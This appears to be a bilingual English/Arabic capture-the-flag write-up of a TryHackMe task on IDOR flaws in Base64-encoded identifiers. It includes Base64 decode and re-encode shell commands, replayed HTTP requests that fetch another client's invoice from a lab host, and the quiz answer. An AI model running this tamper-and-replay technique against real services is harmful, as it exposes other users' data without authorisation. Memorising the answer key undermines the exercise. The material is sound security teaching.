# Task 03 · Finding IDORs in Encoded IDs (اكتشاف ثغرات IDOR في المعرفات المرمزة)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

Not every web application exposes raw plaintext database identifiers in its requests. Many developers attempt to obscure or safely transport identifiers by applying an encoding algorithm before including them in query strings, POST bodies, JSON payloads, or session cookies.

Encoding transforms binary or textual data into an ASCII-compatible character set (typically `A-Z`, `a-z`, `0-9`, `+`, `/`, and `=` for padding). The engineering purpose of encoding is data serialization and transport safety—**NOT security**.

### The Dominance of Base64:
The most ubiquitous encoding algorithm encountered across web applications is **Base64**. Base64 strings exhibit easily recognizable characteristics:
- The character set is restricted to alphanumeric characters plus `+` and `/`.
- The output length is always a multiple of 4 bytes.
- Strings frequently conclude with one or two `=` characters as padding (e.g., `MTIz` represents `123`, and `eyJ1c2VyX2lkIjogNX0=` represents `{"user_id": 5}`).

### The Four-Step Exploitation Workflow for Encoded IDOR:
1. **Extraction & Decoding:** Extract the suspected parameter and decode it via CLI or decoding utilities:
   ```bash
   echo 'MTIz' | base64 -d
   # Output: 123
   ```
2. **Value Tampering:** Modify the decoded plaintext value to target a different object identifier (e.g. changing `123` to `124` or `1`).
3. **Re-Encoding:** Re-encode the altered value back into Base64 format:
   ```bash
   echo -n '1' | base64
   # Output: MQ==
   ```
4. **Replay & Substitution:** Replace the original parameter in the HTTP request with the newly encoded string and submit the request. If the application returns another user's data, the IDOR is confirmed.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **The Fallacy of Security through Obscurity:**
   - A widespread flaw among inexperienced developers is assuming that encoding provides confidentiality. Encoding is a bidirectional, fully reversible mathematical transformation with no secret key. Anyone with access to the string can decode it instantly.
2. **Identifying Multi-Layered Encodings:**
   - In some web stacks, developers apply multiple encoding layers (e.g., URL-encoding on top of Base64, or Hex encoding followed by Base64). Testers should iteratively decode strings until plaintext integers or JSON objects emerge.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Hint for Question 1:** What is the 6-character, radix-64 binary-to-text encoding algorithm that is ubiquitous across web applications and commonly uses `=` as padding? (Starts with `b_____`).

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### 1. Analysis of Question 1:
- *Question:* What is a common type of encoding used by websites?
- *Explanation:* **Base64** is the industry standard encoding scheme used to represent binary data, JSON payloads, and identifiers in ASCII string format across HTTP headers, query parameters, and cookies.
- *Answer:* `base64`

### 2. Practical CLI Demonstration:

Consider an API endpoint returning invoices:
```http
GET /api/download_invoice?file=aW52b2ljZV8xMDUucGRm HTTP/1.1
Host: billing.thm
```

1. Decode parameter:
   ```bash
   echo -n "aW52b2ljZV8xMDUucGRm" | base64 -d
   # Output: invoice_105.pdf
   ```
2. Tamper value to access invoice 104:
   ```bash
   echo -n "invoice_104.pdf" | base64
   # Output: aW52b2ljZV8xMDQucGRm
   ```
3. Replay request:
   ```http
   GET /api/download_invoice?file=aW52b2ljZV8xMDQucGRm HTTP/1.1
   Host: billing.thm
   ```
   If the server downloads Invoice 104 belonging to a different client, an encoded IDOR vulnerability is confirmed.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is a common type of encoding used by websites?*
  - **Answer:** `base64`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Answer `base64` verified against TryHackMe platform engine.
- Reversible encoding and decoding mechanics verified via standard Linux shell utilities.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** الترميز ليس تشفيراً (`Encoding is NOT Encryption`)؛ واستخدام تقنيات مثل `base64` لا يضيف أي حماية أمنية لمعرفات الكائنات. فطالما أن الخادم لا يتحقق من صلاحيات الجلسة على المعرّف المفكوك، يستطيع أي فاحص فك الترميز وتعديل القيمة وإعادة ترميزها للوصول لبيانات الآخرين بسهولة.
